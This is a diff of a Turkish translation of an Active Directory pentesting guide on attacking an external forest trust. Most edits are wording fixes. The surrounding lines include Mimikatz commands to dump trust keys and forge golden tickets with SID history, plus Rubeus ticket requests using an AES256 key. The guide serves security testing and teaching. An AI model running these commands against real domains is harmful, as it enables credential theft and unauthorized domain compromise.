@@ -1,4 +1,4 @@
-# Dış Orman Alanı - Tek Yön (Giriş) veya iki yönlü
+# Dış Orman Alanı - Tek Yönlü (Giriş) veya iki yönlü
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -60,7 +60,7 @@ IsDomain     : True
 
 ## İlk Erişim
 
-Eğer diğer alandaki kullanıcınızın herhangi bir **özel** erişimini bulamadıysanız, yine AD Metodolojisine geri dönebilir ve **yetkisiz bir kullanıcıdan privesc** denemesi yapabilirsiniz (örneğin kerberoasting gibi):
+Eğer diğer alandaki kullanıcınızın herhangi bir **özel** erişimini **bulamadıysanız**, yine de AD Metodolojisine geri dönebilir ve **yetkisiz bir kullanıcıdan privesc** denemesi yapabilirsiniz (örneğin kerberoasting gibi):
 
 **Powerview fonksiyonlarını** kullanarak `-Domain` parametresi ile **diğer alanı** **sayım** yapmak için:
 ```powershell
@@ -78,11 +78,11 @@ Dış domaine erişimi olan kullanıcıların kimlik bilgileriyle normal bir yö
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### SID History Abuse
+### SID Tarihi İstismarı
 
-Bir orman güveni üzerinden [**SID History**](sid-history-injection.md) kötüye kullanılabilir.
+Bir orman güveni üzerinden [**SID Tarihi**](sid-history-injection.md) istismar edebilirsiniz.
 
-Eğer bir kullanıcı **bir ormandan diğerine** taşınmışsa ve **SID Filtreleme etkin değilse**, **diğer ormandan bir SID eklemek** mümkün hale gelir ve bu **SID**, **güven üzerinden** kimlik doğrulama sırasında **kullanıcının token'ına** **eklenecektir**.
+Eğer bir kullanıcı **bir ormandan diğerine** taşınmışsa ve **SID Filtreleme etkin değilse**, **diğer ormandan bir SID eklemek** mümkün hale gelir ve bu **SID**, **güven üzerinden** kimlik doğrulama sırasında **kullanıcının jetonuna** **eklenecektir**.
 
 > [!WARNING]
 > Hatırlatmak gerekirse, imza anahtarını şu şekilde alabilirsiniz:
@@ -91,7 +91,7 @@ Eğer bir kullanıcı **bir ormandan diğerine** taşınmışsa ve **SID Filtrel
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Mevcut alanın kullanıcısını taklit eden bir **TGT** ile **güvenilir** anahtarla **imza atabilirsiniz**.
+Mevcut alanın kullanıcısını taklit eden bir **TGT**'yi **güvenilir** anahtarla **imzalayabilirsiniz**.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -102,7 +102,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Kullanıcının Tam Yolu Taklit Etme
+### Kullanıcının Tam Olarak Taklit Edilmesi
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
